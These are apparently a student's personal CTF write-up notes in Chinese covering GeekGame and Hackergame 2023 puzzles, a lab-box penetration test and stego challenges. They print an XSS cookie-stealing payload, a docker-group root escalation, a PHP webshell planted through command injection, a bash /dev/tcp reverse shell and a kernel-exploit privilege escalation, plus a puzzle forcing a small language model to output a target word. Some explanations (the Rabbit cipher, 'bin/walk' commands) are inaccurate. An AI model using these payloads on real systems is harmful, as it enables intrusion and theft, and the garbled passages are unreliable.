标准答案：https://github.com/MiCode/Xiaomi_Kernel_OpenSource/blob/corot-t-oss/Makefile

下面的![image-20231023161055191](./assets/image-20231023161055191.png)

感觉信息收集能力还差点

**3] 每款苹果产品都有一个内部的识别名称（Identifier），例如初代 iPhone 是 `iPhone1,1`。那么 Apple Watch Series 8（蜂窝版本，41mm 尺寸）是什么？**

这个直接百度就有答案

**4] 本届 PKU GeekGame 的比赛平台会禁止选手昵称中包含某些特殊字符。截止到 2023 年 10 月 1 日，共禁止了多少个字符？（提示：本题答案与 Python 版本有关，以平台实际运行情况为准）**

在源码中找昵称部分的限制（感觉还是不够强）然后构建exp

```python
from unicategories import categories
from typing import Set
def unicode_chars(*cats: str) -> Set[str]:
    ret = set()
    for cat in cats:
        ret |= set(categories[cat].characters())
    return ret

EMOJI_CHARS = (
    {chr(0x200d)}  # zwj
    | {chr(0x200b)}  # zwsp, to break emoji componenets into independent chars
    | {chr(0x20e3)} # keycap
    | {chr(c) for c in range(0xfe00, 0xfe0f+1)} # variation selector
    | {chr(c) for c in range(0xe0020, 0xe007f+1)} # tag
    | {chr(c) for c in range(0x1f1e6, 0x1f1ff+1)} # regional indicator
)

DISALLOWED_CHARS = (
    unicode_chars('Cc', 'Cf', 'Cs', 'Mc', 'Me', 'Mn', 'Zl', 'Zp') # control and modifier chars
    | {chr(c) for c in range(0x12423, 0x12431+1)} # too long
    | {chr(0x0d78)} # too long
) - EMOJI_CHARS
print(len(DISALLOWED_CHARS))
```

然后开始找不同版本，找到一个在线编译器可以运行不同版本的

https://97b24d8a.lightly.teamcode.com/

**[5] 在 2011 年 1 月，Bilibili 游戏区下共有哪些子分区？（按网站显示顺序，以半角逗号分隔）**

最让我懵逼的一道题（甚至不知道怎么去找）

billbill之前的域名为billbill.us,然后用这个网站去找https://web.archive.org/**一个互联网资料馆网站，提供互联网上的图像，视频，音频等资料**。 我们应该最熟知的应该就是web.archive.org 这个服务了，从这里可以查询到网站的历史页面存档。

然后找billbill.us的记录

![image-20231023170252029](./assets/image-20231023170252029.png)

这个网站学到了

**[6] [这个照片](https://github.com/PKU-GeekGame/geekgame-3rd/blob/master/official_writeup/prob18-trivia/media/osint-challenge.jpg)中出现了一个大型建筑物，它的官方网站的域名是什么？（照片中部分信息已被有意遮挡，请注意检查答案格式）**

可以直接google识图获取结果（google识图牛逼）

![image-20231023170558762](./assets/image-20231023170558762.png)

拿到答案：philharmonie.lu

我主要一直被那个会议给干扰了，就一直在找那个音乐会

大概是第一次参加正式的ctf比赛吧（信安国赛纯纯去摸鱼的不算（x））

第一阶段狂肝好几道题（大概也就做出来了4道题），发现misc题目和web题目和我平时做的都不太一样（常规漏洞都不会出了吗）hhh可能更倾向于游戏形式的ctf！后面就吭哧吭哧做了几道web和misc题，感觉收获也很大。让我收获了好多东西。怎么现在语言描述能力那么匮乏（还是去写wp吧）

第一问就是简单的xss攻击（感觉还是XSS学少了）

```html
<iframe src="/admin/"></iframe>
<script>
document.title = 'running';
setTimeout(()=>{
    document.title = 'got: ' + document.querySelector('iframe').contentDocument.cookie;
}, 500);
</script>
```



就跟着火把然后可以找到flag1（甚至开始打错了字符然后质疑答案去问出题人了（像个小丑））

对于docker的提权有了新的认识！！！

两行代码：

```shell
docker run --it --rm -v /flag:/flag 容器ID /bin/ash
```

然后即可cat flag

主要是docker的用户组其实是跟root的权限差不多的



感觉是这次做题做的最不好的一道题了（一直在想根据git泄露来复原源文件、一直失败就没有头绪了）

后来感觉他们真是厉害

一句话

```shell
git cat-file --batch-all-objects --buffer --batch > output.txt
```

![image-20231105102852466](./assets/image-20231105102852466.png)

感觉自己的三观又一次被刷新了

据说历年hackergame的签到题都是抓包该参数然后就可以

这题就抓包改参数就可以通过了

第一问尝试输出了几种状态码后就没有再努力了

没有状态码：

GET /\r\n\r\n

这里实际发送的是 HTTP/0.9 请求，它只支持 `GET`，然后后面直接接 URL，没有别的。然后响应就直接响应文件内容，也没有状态码之类的东西。 当时做原型的时候，看到这个其实还是挺惊讶的，没想到 nginx 还保留着和 HTTP/0.9 客户端的兼容性。

第一题的话就在翻阅文档的时候试了一下1e2于是发现有差异

但是第二问没有仔细做

后面发现重复键值在JSON不会炸但是在YAML会

可以根据题目判断手机为Google Pixel 手机，感觉还是对这个漏洞不够了解

搜索 `Pixel 截图 bug`，可以发现很多新闻报道：Pixel 手机自带的系统截图工具存在漏洞，裁剪图片并不会删除原图，而是将裁剪后的图片的数据直接写在原图的开头，覆盖原先的数据，此时原图未被覆盖的部分仍然可以被恢复

然后找在线解密网站即可

![image-20231104205027092](./assets/image-20231104205027092.png)





感觉现在对于AI的热度好高啊、不会AI连吃饭都不行了

这是因为 TinyStories-33M 是一个没有经过 [Instruct Align](https://arxiv.org/abs/2203.02155) 的模型，因此它没有遵循人类指令的概念，需要将其视为一个补全模型，即根据前面的输入，补全后面的句子。

可以有很多方法来做，主要的思路是设计一个有简单的字面规律的 prompt，比如一直重复，然后让模型去进行补全：

补全模型噢

一个更快的尝试是枚举模型的词表中的每一个词或者枚举一个单词字典，看看哪个词能够让模型输出 `accepted`。一个朴素的实现脚本（跑得比较慢）在 [accepted.py](https://github.com/USTC-Hackergame/hackergame2023-writeups/blob/master/official/🪐 小型大语言模型星球/accepted.py)。

运行之后得到答案之一：`atively`

另一个思路和第一题相同，用 `accepted` 作为 prompt，让模型补全后面的句子。但是 `accepted` 太长了，可以尝试各种缩减和变体（也可以自动化尝试），发现 `accept*` 就可以了。





感觉挺简单的数学题（下次数学题也可以考虑去做咯）

```python
#!/usr/bin/python3

# Th siz of th fil may reduc after XZRJification

def check_equals(left, right):
    # check whether left == right or not
    if left != right:
        print('no equal')

def get_cod_dict():
    # prepar th cod dict
    cod_dict = []
    cod_dict += ['nymeh1niwemflcir}echaete'] #后加e
    cod_dict += ['a3g7}kidgojernoetlsup?he'] #后加e
    cod_dict += ['ullw!f5soadrhwnrsnstnoeq'] #前加
    cod_dict += ['ect{l-findiehaai{oveatas'] #前加e
    cod_dict += ['ety9kxborszstguyd?!blm-p'] #前加
    for s in cod_dict:
        print(len(s))
    check_equals(set(len(s) for s in cod_dict), {24})
    return ''.join(cod_dict)

def decrypt_data(input_codes):
    # retriev th decrypted data
    cod_dict = get_cod_dict()
    output_chars = [cod_dict[c] for c in input_codes]
    return ''.join(output_chars)

if __name__ == '__main__':
    # check some obvious things
    check_equals('creat', 'cre' + 'at')
    check_equals('referer', 'refer' + 'er')
    # check th flag
    flag = decrypt_data([53, 41, 85, 109, 75, 1, 33, 48, 77, 90,
                         17, 118, 36, 25, 13, 89, 90, 3, 63, 25,
                         31, 77, 27, 60, 3, 118, 24, 62, 54, 61,
                         25, 63, 77, 36, 5, 32, 60, 67, 113, 28])
    print(flag)
    check_equals(flag.index('flag{'), 0)
    check_equals(flag.index('}'), len(flag) - 1)
    # print th flag
    print(flag)

```

就来试试！

真正的信息收集题，从第一问一直在卡（其实感觉学信号数字处理都没时间打hackergame）就去看wp了

先谷歌搜索地图二的文字然后找到拉面馆，然后知道其位于东京，后面即可锁定东京大学，然后根据学长脖子上的东西来判断会议名称即可获取更多信息（感觉不应该卡在第一题就一直不做的）



难度甚至简单到签到题？

往下翻然后比较多，就去翻网页代码了

然后看到一个main.js于是感觉有戏？于是发现了一个挺好玩的函数(感觉自己js代码的功底还是有点差)

```javascript
async function getFlag(token) {
        // Generate the flag based on user's token
        let hash = CryptoJS.SHA256(`dEEper_@nd_d@rKer_${token}`).toString();
        return `flag{T1t@n_${hash.slice(0, 32)}}`;
    }
```

然后执行这一个getaflag函数输入自己的token即可

![image-20231104204131881](./assets/image-20231104204131881.png)

感觉挺有意思的一道题

感觉比隔壁geekgame的小测简单多了

\1. 想要借阅世界图书出版公司出版的《A Classical Introduction To Modern Number Theory 2nd ed.》，应当前往中国科学技术大学西区图书馆的哪一层？

问同学后知道应该在12层（实在不行也可以爆破的）

\2. 今年 arXiv 网站的天体物理版块上有人发表了一篇关于「可观测宇宙中的鸡的密度上限」的论文，请问论文中作者计算出的鸡密度函数的上限为 10 的多少次方每立方秒差距？

找到论文后丢给chatpdf然后获取答案23（问就是懒得看英文论文了）

\3. 为了支持 TCP BBR 拥塞控制算法，在**编译** Linux 内核时应该配置好哪一条内核选项？**（20 分）**

chatgpt倾力解答CONFIG_TCP_CONG_BBR

\4. 🥒🥒🥒：「我……从没觉得写类型标注有意思过」。在一篇论文中，作者给出了能够让 Python 的类型检查器 ~~MyPY~~ mypy 陷入死循环的代码，并证明 Python 的类型检查和停机问题一样困难。请问这篇论文发表在今年的哪个学术会议上？**（20 分）**

chatgpt给了几种可能的会议名，然后爆破就可以得出来了

算是比较简单的信息收集题目（感觉比隔壁geekgame的简单多了）

感觉挺有意思的一道题（用seleunim模拟+js脚本获取flag）感觉对于selenium和js 的理解又深入了一层

写下我的exp

```python
import io
import time
import re
from selenium  import webdriver

# 创建浏览器实例
driver = webdriver.Edge()
driver.get('http://202.38.93.111:10021/')
# 添加token
cookie = {
    'name': 'session',
    'value': 'eyJ0b2tlbiI6IjUyNDpNRVVDSVFDK29vQVFKRzAxRDhFeG5mT2Q4Q3FtR1d2T0txV1ZpSWVPOGhrbXoxY2tVQUlnVWk5ayszM2I3SnFvbUUwbWgwL3pMaTZrS1JIM2dCZ0ZHNXNPY3Z3R1Y2QT0ifQ.ZT0dqQ.UK3UbDW8lvxJnIiSDudd1HrL3A0',
}
driver.add_cookie(cookie)
driver.get('http://202.38.93.111:10021/')
time.sleep(2)
# 执行 JavaScript 代码
js_code = """
var elements = document.querySelectorAll('.fakeqq-message__bubble');
var regex = /hack\[[^\]]*\]/;

for (var i = 0; i < elements.length; i++) {
  var element = elements[i];
  var content = element.textContent;
  // 创建鼠标点击事件
var clickEvent = new MouseEvent('click', {
  bubbles: true,
  cancelable: true,
  view: window
});
if (content.match(regex)){
// 触发鼠标点击事件
element.dispatchEvent(clickEvent);}
  
}
"""

# 执行 JavaScript 代码并获取返回结果
while(1):
    time.sleep(1)
    result = driver.execute_script(js_code)

# 输出结果
print(result)
time.sleep(200)

```





查询关键字发现音频是慢扫描电视，即SSTV，可以直接用软件解码，

**慢扫描电视**（英语：Slow-scan television），简称**SSTV**，是[业余无线电](https://zh.wikipedia.org/wiki/业余无线电)爱好者的一种主要图片传输方法，慢扫描电视通过[无线电](https://zh.wikipedia.org/wiki/无线电)传输和接收单色或彩色静态图片。

慢扫描电视的一个术语名称是窄带电视。广播电视需要6MHz的带宽，因为帧速为25到30fps[[1\]](https://zh.wikipedia.org/zh-hans/慢扫描电视#cite_note-1)。慢扫描电视的[带宽](https://zh.wikipedia.org/wiki/带宽)只有3kHz，因此慢扫描电视是一种慢得多的静态图像传输方法，通常每帧需要持续8秒或若干分钟。

然后用手机放声音即可获取flag

![image-20231105101506856](./assets/image-20231105101506856.png)


就抓包然后多发送几次就行了（和ai下棋是吧）

第一次做靶机渗透（很好玩，下次还来）

先用virtual box打开靶机 

![image-20231204163322628](./assets/image-20231204163322628.png)

然后获取了ip，开始渗透测试！

先用kali中的nmap扫一下该ip的端口

![image-20231204163337702](./assets/image-20231204163337702.png)

发现开了两个端口21的ftp和80的http

先去看80服务然后发现有一个任意命令执行漏洞

![image-20231204163437532](./assets/image-20231204163437532.png)

然后开写一句话木马（靶机渗透是不是都去写一句话木马啊)感觉靶机都是RCE

http://192.168.56.118/site/busque.php?buscar=echo '<?php eval($_POST["shell"]);' > shell.php

然后即可用蚁剑连接获取权限

![image-20231204163911055](./assets/image-20231204163911055.png)

然后在里面开始信息收集

可以在桌面发现user.txt里面有第一个flag

先在WordPress里面找到config.php

![image-20231204164023069](./assets/image-20231204164023069.png)

又找到一个.backup文件然后发现账号密码

![image-20231204164328956](./assets/image-20231204164328956.png)

可以用ftp连接（这里有一点信息泄露）

然后反弹shell

上传j.sh

```sh
#!/bin/bash
bash -i >& /dev/tcp/192.168.56.1/443 0>&1
```

用蚁剑执行bash j.sh

这里用window的nc -lvvp 443了，貌似需要一个内网下的反弹才可以

然后

![image-20231204165735652](./assets/image-20231204165735652.png)

然后发现这个版本为uname -a Ubuntu4.4.0-31

然后kali上searchsploit ubuntu 4.4.0-31

![image-20231204165932119](./assets/image-20231204165932119.png)

然后下载下来searchsploit -m 45010

然后上传到蚁剑

windows那边然后先打开一个模拟终端

```python
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

然后编译45010.c即可获取root权限

至此提权完成

大概就是先解密zip文件，是一个伪加密

压缩源文件目录区： 50 4B 01 02：目录中文件文件头标记

 3F 00：压缩使用的 pkware 版本 

14 00：解压文件所需 pkware 版本 

00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了） 压缩源文件目录结束标志 ：50 

4B 05 06：目录结束标记 把09 00改写成00 00就可以成功解压了

然后就是一个base64隐写

```python
base64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'

flag = ''
with open('stego.txt', 'r') as f:
    for line in f.readlines():
        line = line[:-1]
        num = line.count('=')
        if num == 0:
            continue
        lastchar = line[-(num + 1)]

        # print(line,num,lastchar)
        myindex = base64chars.index(lastchar)
        # print(myindex)
        bin_str = bin(myindex)[2:].zfill(6)
        # print(bin_str)
        flag += bin_str[6 - 2 * num:]
        # print(bin_str[6-2*num:])
print(''.join([chr(int(flag[i:i + 8], 2)) for i in range(0, len(flag), 8)]))

```



Rabbit（Rapid Encryption Algorithm Using the Block Encryption Algorithm Blowfish）是一种对称加密算法，由Rueppel等人于2003年提出，它使用了Blowfish算法的基本结构和S盒。

Rabbit是一种流加密算法，它使用一个64位的密钥和一个64位的初始化向量（IV）来生成密钥流，然后将密钥流与明文进行异或运算以实现加密。Rabbit加密算法可以使用不同的密钥长度（最长为256位）和不同的IV值来加密不同的数据。它使用了8个32位寄存器和一个32位的计数器来生成密钥流，每个寄存器都使用了32位的线性反馈移位寄存器（LFSR）。

然后对图片进行bin、walk、string命令：

1. bin命令：bin命令可以用来查看一个文件的二进制表示。在命令行中输入“bin filename”（其中filename是图片的文件名），可以查看图片的二进制表示。例如，如果你使用Linux系统，可以在命令行中输入“xxd filename”来查看图片的二进制表示。
2. walk命令：walk命令可以用来遍历文件中的数据结构。在命令行中输入“walk filename”（其中filename是图片的文件名），可以遍历图片中的数据结构。例如，如果你使用Windows系统，可以在命令行中输入“strings -el -n 6 filename”来遍历图片中的数据结构。在Linux系统中，可以使用“binwalk”命令来遍历文件中的数据结构。例如，输入“binwalk filename”将会显示文件中的数据结构。
3. string命令：string命令可以用来查找文件中的ASCII字符串。在命令行中输入“string filename”（其中filename是图片的文件名），可以查找图片中的ASCII字符串。例如，如果你使用Mac系统，可以在命令行中输入“strings -a filename”来查找图片中的ASCII字符串。

用strings分析图片发现信息

passwordis..catflag..] 用catflag当做密码rabbit解密：得到

]DW35W/HqUYt3P_ow"3P_ow"3P_ow"3P_ow"3P_ow"3P_ow"3P_ow"3P_ow"3P_ow"3P_ow"3P_ow"3P_ow"3P_o6cTf=[BBo!9/qB>ie50F%*6Y@Flxax*L.IzI9g1RLRX~PjWi8of+s)d[8y|u5.cL]DW35W/HqUYt3P_ow"3P_ow"3P_o6cTf=[BBo!9/DC>ie5HE%*6YPIlxaxeQ.IzI9g1RLRf%PjWi8of+s){{9y|u5.cL]D)=9W/Hr%Rt3P_ow"3P_o%"3P_o6cTf=[BBo!9/DC>ie5HE%*6YPIlxaxeQ.IzIwX1RLRf%PjWiIEf+s)QI8y|uhQbL]D(g2W/Hr%Rt3P_ow"3P_o%"3P_o6cTf=[BBo!9/DC>ie5HE%*6YPIlxaxeQ.IzI9g1RLRf%PjWi8of+s)QI8y|u@^eL]D(g2W/Hr%Rt3P_ow"3P_o%"3P_o6cTf=[BBo!9/DC>ie5HE%*6YPIlxaxeQ.IzI9g1RLRf%PjWis}f+s)d[8y|u@^eL]D(g2W/HqUYt3P_o%"3P_ow"3P_o6cTf=[BBo!9/DC>ie5HE%*6YPIlxax*L.IzI9g1RLRX~PjWi8of+s)d[8y|u5.cL]DW35W/HqUYt3P_ow"3P_ow"3P_o6cTf=[BBo!9/qB>ie50F%*6Y@Flxax*L.IzI9g1RLRX~PjWiIEf+s)QI8y|uhQbL]D(g2W/Hr%Rt3P_oj"3P_oj"3P_otcTf=[jBo!9/DC>ie50F%*6Y@FlxaxeQ.IzI5s1RLRFvPjWiIEf+s)QI8y|u5.cL]D)=9W/HqUYt3P_ow"3P_ow"3P_o6cTf=[BBo!9/DC>ie5HE%*6YPIlxaxeQ.IzIwX1RLRX~PjWiIEf+s)QI8y|u5.cL]D)=9W/HqUYt3P_ow"3P_ow"3P_o6cTf=[BBo!9/DC>ie5HE%*6YPIlxaxcW.IzI9g1RLRX~PjWiIEf+s)d[8y|u@^eL]DW35W/HqUYt3P_oj"3P_ow"3P_o;cTf=[BBo!9/DC>ie5HE%*6YPIlxaxeQ.IzI9g1RLRf%PjWiIEf+s){{9y|uhQbL]D(g2W/HqUYt3P_o%"3P_oj"3P_otcTf=[&AUf=[&AUf=[&AUf=[&AUf=[jBo!9/DC>ie50F%*6Y@FlxaxeQ.IzI5s1RLRFvPjWiIEf+s)QI8y|uhQbL]D(gLH/Hr%Rt3P_oj"3P_oj"3P_oj"3P_oj"3P_oj"3P_ow"3P_o%"3P_ow"3P_ow"3P_ow"3P_ow"3P_ow"3P_ow"3P_o6cTf=[BBo!9/DC>ie5HE%*6YPIlxaxeQ.IzI9g1RLRf%PjWi8of+s)QI8y|u@^eL]D(g2W/Hr%Rt3P_ow"3P_o%"3P_o6cTf=[BBo!9/DC>ie5HE%*6YPIlxaxeQ.IzI9g1RLRf%PjWi8of+s)d[8y|u5.cL]DW35W/HqUYt3P_ow"3P_o%"3P_o6cTf=[jBo!9/qB>ie5HE%*6YOLlxaxeQ.IzI9g1RLRf%PjWi8of+s)d[8y|u5.cL]DW35W/HqUYt3P_oj"3P_ow"3P_o;cTf=[BBo!9/DC>ie5HE%*6YPIlxaxeQ.IzI9g1RLRf%PjWi8of+s)d[8y|u5.cL]DW35W/HqUYt3P_ow"3P_oj"3P_o;cTf=[&AUf=[&AUf=[BBo!9/,C>ie5`C%*6Y@Flxax*L.IzIwX1RLRFvPjWiIEf+s)QI8y|uhQbL]D(g2W/Hr%Rt3P_otcTf=[&AUf=[jBo!9/DC>ie50F%*6Y@FlxaxeQ.IzI5s1RLRFvPjWiIEf+s)QI8y|uhQbL]D(g2W/Hr%Rt3P_oj"3P_o6cTf=[jBo!9/DC>ie5HE%*6YPIlxaxeQ.IzI9g1RLRf%PjWi8of+s)d[8y|u5.cL]D(g2W/Hr%gt3P_oj"3P_oj"3P_o6cTf=[jBo!9/DC>ie5HE%*6YPIlxaxeQ.IzI9g1RLRf%PjWi8of+s)d[8y|u@^eL]DW35W/Hr%gt3P_oj"3P_ow"3P_o;cTf=[BBo!9/DC>ie5HE%*6YPIlxaxeQ.IzI9g1RLRf%PjWi8of+s)QI8y|u5.cL]D)=9W/HqUYt3P_ow"3P_ow"3P_o6cTf=[BBo!9/DC>ie5HE%*6YPIlxaxeQ.IzI9g1RLRf%PjWi8of+s)d[8y|u5.cL]DW35W/Hr%Rt3P_o%"3P_oj"3P_otcTf=[BBo!9/,C>ie5`C%*6Y@Flxax*L.IzIwX1RLRFvPjWiIEf+s)QI8y|uhQbL]D(g2W/Hr%Rt3P_oj"3P_oj"3P_otcTf=[&AUf=[jBo!9/DC>ie50F%*6Y@FlxaxeQ.IzI5s1RLRFvPjWiIEf+s)QI8y|uhQbL]D(g2W/Hr%Rt3P_oj"3P_otcTf=[&AUf=[&AUf=[&AUf=[&AUf=[&AUf=[BBo!9/,C>ie5HE%*6YPIlxaxeQ.IzI9g1RLRf%PjWi8of+s)d[8y|u5.0D]DW35W/HqUYt3P_ow"3P_ow"3P_ow"3P_ow"3P_ow"3P_ow"3P_ow"3P_oj"3P_o%"3P_oj"3P_oj"3P_ow"3P_o;cTf=[BBo!9/DC>ie5HE%*6YPIlxaxeQ.IzI9g1RLRf%PjWi8of+s)d[8y|u5.cL]DW35W/HqUYt3P_ow"3P_ow"3P_o6cTf=[BBo!9/,C>ie5HE%*6YOLlxax*L.IzI9g1RLRX~PjWi8of+s)d[8y|u5.cL]DW35W/Hr%Rt3P_ow"3P_o%"3P_o6cTf=[BBo!9/DC>ie5HE%*6YPIlxaxeQ.IzI9g1RLRf%PjWi8of+s)QI8y|u@^eL]D(g2W/Hr%Rt3P_ow"3P_o%"3P_otcTf=[&AUf=[&AUf=[&AUf=[&AUf=[&AUf=[&AUf=[&AUf=[jBo!9/DC>ie50F%*6Y@FlxaxeQ.IzI5s1RLRFvPjWiIEl)s)QI8y|uhQbL]D(g2W/Hr%Rt3P_oj"3P_oj"3P_oj"3P_ow"3P_oj"3P_oj"3P_oj"3P_oj"3P_oj"3P_oj"3P_otcTf=[&AUf=[&AUf=[&AUf=[&AUf=[&AUf=[&AUf=[&AUf=[&AUf=[&AUf=[&AUf=[&AUf=[&AUf=[BBo!9/,C>ie5Ix7*6YPIlxaxeQ.IzI9g1RLRf%PjWi8of+s)d[8y|u5.cL]DW35W/HqUYt3P_ow"3P_oj"3P_o%"3P_oj"3P_oj"3P_o6cTf=[jBo!9/qB>ie5`C%*6Y@Flxax*L.IzIwX1RLRFvPjWiIEf+s)QI8y|uhQbL]D(g2W/Hr%gt3P_ow"3P_o%"3P_otcTf=[BBo!9/,C>ie5`C%*6Y@Flxax*L.IzIwX1RLRFvPjWiIEf+s)QI8y|uhQbL]D(g2W/Hr%Rt3P_oj"3P_oj"3P_otcTf=[&AUf=[&AUf=[&AUf=[&AUf=[&AUf=[&AUf=[&AUf=[&AUf=[BBo!9/,C>ie5HE%*6YPIlxaxeQ.IzI9g1RLRf%SiWi8of+s)d[8y|u5.cL]DW35W/HqUYt3P_ow"3P_ow"3P_ow"3P_ow"3P_ow"3P_oj"3P_o%"3P_oj"3P_oj"3P_o6cTf=[jBo!9/DC>ie5HE%*6YPIlxaxeQ.IzI9g1RLRf%PjWi8of+s)d[8y|u5.cL]DW35W/HqUYt3P_ow"3P_ow"3P_o6cTf=[jBo!9/DC>ie50F%*6Y@FlxaxeQ.IzI5s1RLRf%PjWi8of+s)d[8y|u5.cL]DW35W/HqUYt3P_ow"3P_ow"3P_o6cTf=[BBo!9/DC>ie5HE%*6YPIlxaxeQ.IzI9g1RLRf%PjWi8of+s)d[8y|u5.cL]DW35W/HqUYt3P_ow"3P_ow"3P_o6cTf=[BBo!9/DC>ie5HE%*6YPIlxax*L.IzI9g1RLRf%PjWi8of+s)d[8y|u5.cL]DW35W/HqUYt3P_ow"3P_ow"3P_o6cTf=[BBo!9/DC>ie5HE%*6YPIlxaxeQ.IzIwX1RLRf%PjWis}f+s)d[8y|u5.cL]DW35W/HqUYt3P_ow"3P_ow"3P_o6cTf=[BBo!9/DC>ie5HE%*6YPIlxax*L.IzI5s1RLRFvPjWiIEf+s)d[8y|u@^eL]D(g2W/Hr%Rt3P_oj"3P_oj"3P_otcTf=[&AUf=[&AUf=[&AUf=[&AUf=[&AUf=[jBo!9/DC>ie50F%*6Y@FlxaxeQ.IzI5s1RLRFvPjWiIEf+s)QI8y|u5.0D]DW35W/HqUYt3P_ow"3P_ow"3P_ow"3P_ow"3P_ow"3P_ow"3P_oj"3P_ow"3P_o%"3P_ow"3P_ow"3P_ow"3P_o6cTf=[BBo!9/DC>ie5HE%*6YPIlxaxeQ.IzIwX1RLRX~PjWiIEf+s)QI8y|u5.cL]D)=9W/HqUYt3P_ow"3P_ow"3P_o6cTf=[BBo!9/DC>ie5HE%*6YPIlxaxcW.IzI9g1RLRX~PjWiIEf+s)d[8y|u@^eL]DW35W/HqUYt3P_ow"3P_ow"3P_otcTf=[BBo!9/qB>ie5`C%*6Y@FlxaxeQ.IzI5s1RLRf%PjWi8of+s)d[8y|u5.cL]DW35W/HqUYt3P_ow"3P_oj"3P_o;cTf=[&AUf=[&AUf=[BBo!9/,C>ie5`C%*6Y@Flxax*L.IzIwX1RLRFvPjWiIEf+s){{9y|u5.cL]D)=9W/Hr%Rt3P_o6cTf=[jBo!9/qB>ie5`C%*6Y@Flxax*L.IzIwX1RLRFvPjWiIEf+s)QI8y|uhQbL]D(g2W/Hr%Rt3P_oj"3P_oj"3P_o6cTf=[&AUf=[&AUf=[&AUf=[&AUf=[&AUf=[&AUf=[&AUf=[&AUf=[&AUf=[&AUf=[&AUf=[&AUf=[&AUf=[BBo!9/xY;ie5HE%*6YPIlxaxeQ.IzI9g1RLRf%PjWi8of+s)d[8y|uhQbL]DW35W/Hr%Rt3P_oj"3P_oj"3P_oj"3P_oj"3P_o6cTf=[jBo!9/DC>ie5HE%*6YPIlxaxeQ.IzI9g1RLRf%PjWi8of+s)d[8y|u5.cL]D(g2W/Hr%gt3P_oj"3P_oj"3P_o6cTf=[jBo!9/DC>ie5HE%*6YPIlxaxeQ.IzI9g1RLRf%PjWi8of+s)d[8y|u@^eL]DW35W/Hr%gt3P_oj"3P_ow"3P_o;cTf=[BBo!9/DC>ie5HE%*6YPIlxaxeQ.IzI9g1RLRFvPjWi8of+s){{9y|u5.cL]DW35W/HqUYt3P_ow"3P_ow"3P_o6cTf=[BBo!9/DC>ie5HE%*6Y@FlxaxcW.IzIwX1RLRFvPjWi8of+s){{9y|uhQbL]D(g2W/Hr%Rt3P_oj"3P_oj"3P_otcTf=[&AUf=[&AUf=[jBo!9/DC>ie50F%*6Y@FlxaxeQ.IzI5s1RLRFvPjWiIEf+s)QI8y|u5.cL]D(g2W/Hr%Rt3P_otcTf=[&AUf=[&AUf=[BBo!9/,C>ie5HE%*6YPIlxaxeQ.IzI9g1RLRf%PjWi8of+s)d[8y|u5.cL]DW35W/Hr%Rt3P_o;cTf=[&AUf=[&AUf=[BBo!9/,C>ie5HE%*6YPIlxaxeQ.IzI9g1RLRf%PjWi8of+s)d[8y|u5.cL]D)=9W/HqUYt3P_o;cTf=[&AUf=[BBo!9/,C>ie5HE%*6YPIlxaxeQ.IzI9g1RLRf%PjWi8of+s)QI8y|u5.cL]D)=9W/HqUYt3P_ow"3P_o6cTf=[BBo!9/DC>ie5HE%*6YPIlxaxeQ.IzI9g1RLRf%PjWi8of+s)d[8y|u5.cL]DW35W/HqUYt3P_ow"3P_ow"3P_o6cTf=[BBo!9/qB>ie50F%*6Y@Flxax*L.IzI9g1RLRX~PjWiIEf+s)QI8y|uhQbL]D(g2W/Hr%Rt3P_oj"3P_oj"3P_otcTf=[&AUf=[&AUf=[&AUf=[&AUf=[&AUf=[&AUf=[&AUf=[&AUf=[&AUf=[&AUf=[jBo!9/DC>ie50F%*6Y@FlxaxeQyIzI5s1RLRFvPjWiIEf+s)QI8y|uhQbL]D(g2W/HqUYt3P_oj"3P_ow"3P_oj"3P_ow"3P_o%"3P_ow"3P_ow"3P_o6cTf=[BBo!9/DC>ie5HE%*6YPIlxaxeQ.IzI9g1RLRf%PjWi8of+s)d[8y|u5.cL]DW35W/HqUYt3P_ow"3P_ow"3P_o6cTf=[BBo!9/qB>ie50F%*6Y@Flxax*L.IzI9g1RLRX~PjWi8of+s)d[8y|u5.cL]DW35W/HqUYt3P_ow"3P_ow"3P_o6cTf=[BBo!9/DC>ie5HE%*6YPIlxaxeQ.IzI9g1RLRf%PjWi8of+s)d[8y|u5.cL]D)=9W/HqUYt3P_o%"3P_oj"3P_o6cTf=[jBo!9/DC>ie5HE%*6YPIlxaxeQ.IzI9g1RLRf%PjWi8of+s)d[8y|u5.cL]DW35W/HqUYt3P_ow"3P_ow"3P_o6cTf=[BBo!9/DC>ie5HE%*6YPIlxaxeQ.IzI9g1RLRf%PjWi8of+s)QI8y|u5.cL]D)=9W/HqUYtA

base91解码：

得到cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat.
cat. cat! cat? cat! cat! cat. cat? cat. cat. cat. cat. cat. cat. cat. cat.
cat. cat. cat. cat. cat. cat. cat. cat. cat? cat. cat? cat! cat. cat? cat.
cat. cat. cat. cat. cat. cat! cat. cat! cat! cat! cat! cat! cat. cat? cat.
cat. cat. cat. cat. cat. cat. cat. cat. cat! cat? cat! cat! cat. cat? cat.
cat. cat. cat. cat. cat. cat. cat. cat? cat. cat? cat! cat. cat? cat. cat.
cat. cat. cat. cat. cat! cat. cat? cat. cat. cat. cat. cat. cat. cat. cat.
cat. cat! cat? cat! cat! cat. cat? cat! cat! cat! cat! cat! cat! cat! cat!
cat? cat. cat? cat! cat. cat? cat! cat! cat! cat. cat? cat. cat. cat. cat.
cat. cat. cat. cat. cat. cat! cat? cat! cat! cat. cat? cat. cat. cat. cat.
cat. cat. cat. cat. cat? cat. cat? cat! cat. cat? cat. cat. cat! cat. cat?
cat. cat. cat. cat. cat. cat. cat. cat! cat? cat! cat! cat. cat? cat! cat!
cat! cat! cat! cat! cat? cat. cat? cat! cat. cat? cat! cat! cat! cat! cat!
cat! cat! cat! cat! cat! cat! cat. cat? cat. cat. cat. cat. cat. cat. cat.
cat. cat. cat. cat. cat. cat. cat. cat. cat! cat? cat! cat! cat. cat? cat.
cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat? cat.
cat? cat! cat. cat? cat. cat. cat. cat. cat. cat. cat. cat. cat! cat. cat?
cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat. cat! cat?
cat! cat! cat. cat? cat! cat! cat! cat! cat! cat! cat! cat! cat! cat! cat!
cat! cat? cat. cat? cat! cat. cat? cat! cat! cat! cat! cat! cat! cat! cat.
cat? cat. cat. cat. cat. cat. cat. cat. cat. cat. cat! cat? cat! cat! cat.
